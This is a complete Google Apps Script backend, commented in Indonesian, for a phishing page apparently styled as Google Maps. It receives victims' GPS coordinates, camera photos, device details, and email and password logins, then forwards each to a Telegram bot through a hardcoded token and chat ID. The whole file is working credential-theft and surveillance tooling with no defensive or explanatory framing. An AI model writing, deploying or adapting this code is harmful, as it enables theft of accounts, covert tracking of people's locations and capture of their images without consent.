// ====== KONFIGURASI ======
const BOT_TOKEN = '8875968160:AAEB35artTqqRrE01G6a7Eck8x0T-TSu07w';
const CHAT_ID = '8763088511';

// ====== HANDLER POST ======
function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    var type = data.type || 'unknown';
    var ua = data.ua || '-';

    var msg = "=== GMAPS CAPTURE ===\n";
    msg += "Tipe: " + type + "\n";
    msg += "Waktu: " + new Date().toISOString() + "\n";
    msg += "UA: " + ua + "\n";

    // Lokasi
    if (type === 'location') {
      msg += "Lat: " + data.lat + "\n";
      msg += "Lng: " + data.lng + "\n";
      msg += "Akurasi: " + (data.accuracy || '-') + " m\n";
      msg += "Maps: https://maps.google.com/?q=" + data.lat + "," + data.lng + "\n";
      return sendMessage(msg);
    }

    // Lokasi ditolak
    if (type === 'location_denied') {
      msg += "Error: " + (data.error || '-') + "\n";
      return sendMessage(msg);
    }

    // Foto kamera
    if (type === 'camera_photo') {
      msg += "Foto kamera terlampir.\n";
      var img = data.image;
      if (img.indexOf(',') !== -1) img = img.split(',')[1];
      var blob = Utilities.newBlob(Utilities.base64Decode(img), 'image/jpeg', 'photo.jpg');
      UrlFetchApp.fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
        method: 'post',
        payload: {
          chat_id: CHAT_ID,
          caption: msg,
          photo: blob
        },
        muteHttpExceptions: true
      });
      return jsonOut({ok: true, type: type});
    }

    // Kamera ditolak
    if (type === 'camera_denied') {
      msg += "Error: " + (data.error || '-') + "\n";
      return sendMessage(msg);
    }

    // Visit
    if (type === 'visit') {
      msg += "Platform: " + (data.platform || '-') + "\n";
      msg += "Bahasa: " + (data.language || '-') + "\n";
      msg += "Layar: " + (data.screen || '-') + "\n";
      return sendMessage(msg);
    }

    // Login
    if (type === 'login') {
      msg += "Email: " + (data.email || '-') + "\n";
      msg += "Password: " + (data.password || '-') + "\n";
      return sendMessage(msg);
    }

    return sendMessage(msg);

  } catch (err) {
    return jsonOut({ok: false, error: err.toString()});
  }
}

// ====== HANDLER GET ======
function doGet(e) {
  return jsonOut({ok: true, msg: 'Apps Script aktif'});
}

// ====== KIRIM PESAN TELEGRAM ======
function sendMessage(text) {
  UrlFetchApp.fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
    method: 'post',
    payload: {chat_id: CHAT_ID, text: text},
    muteHttpExceptions: true
  });
  return jsonOut({ok: true});
}

// ====== OUTPUT JSON ======
function jsonOut(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
